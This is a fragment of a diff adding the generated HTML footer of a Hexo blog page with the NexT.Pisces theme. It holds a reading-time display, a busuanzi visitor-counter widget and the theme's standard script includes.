+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
